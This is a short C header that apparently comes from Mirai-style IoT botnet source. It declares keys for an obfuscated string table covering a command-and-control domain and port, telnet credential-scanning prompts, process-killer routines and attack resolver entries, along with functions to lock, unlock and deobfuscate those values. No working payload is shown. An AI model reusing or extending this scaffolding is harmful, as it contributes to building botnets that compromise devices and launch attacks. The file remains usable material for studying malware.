#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};


#define TABLE_CNC_PORT 1
#define TABLE_CNC_DOMAIN 2
#define TABLE_SCAN_CB_DOMAIN 3
#define TABLE_SCAN_CB_PORT 4
#define TABLE_EXEC_SUCCESS 5
#define TABLE_SCAN_SHELL 6
#define TABLE_SCAN_ENABLE 7
#define TABLE_SCAN_SYSTEM 8
#define TABLE_SCAN_SH 9
#define TABLE_SCAN_QUERY 10
#define TABLE_SCAN_RESP 11
#define TABLE_SCAN_NCORRECT 12
#define TABLE_SCAN_PS 13
#define TABLE_SCAN_KILL_9 14
#define TABLE_KILLER_PROC 15
#define TABLE_KILLER_EXE 16
#define TABLE_KILLER_FD 17
#define TABLE_KILLER_MAPS 18
#define TABLE_KILLER_TCP 19
#define TABLE_MEM_ROUTE 20
#define TABLE_MEM_MASUTA1 21
#define TABLE_MEM_MASUTA2 22
#define TABLE_ATK_VSE 23
#define TABLE_ATK_RESOLVER 24
#define TABLE_ATK_NSERV 25
#define TABLE_MISC_WATCHDOG 26
#define TABLE_MISC_WATCHDOG2 27
#define TABLE_SCAN_ASSWORD 28
#define TABLE_SCAN_OGIN 29
#define TABLE_SCAN_ENTER 30
#define TABLE_MISC_RAND 31
#define TABLE_KILLER_STATUS 32
#define TABLE_KILLER_ANIME 33

#define TABLE_MAX_KEYS 34

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
